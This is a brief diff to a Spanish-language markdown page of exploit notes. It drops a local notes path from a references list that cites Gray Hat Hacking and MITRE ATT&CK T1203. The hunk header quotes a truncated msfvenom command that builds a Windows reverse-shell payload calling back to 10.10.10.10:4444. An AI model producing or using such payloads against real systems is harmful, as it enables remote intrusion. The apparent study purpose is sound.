@@ -53,4 +53,3 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -b "\x00\x0a\
 ## Referencias
 - Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
 - MITRE Corporation. (2024). ATT&CK Technique T1203: Exploitation for Client Execution. https://attack.mitre.org/techniques/T1203/
-- Notas del proyecto: notas-md/HNotes/HNotes/Hacking/Exploits.md
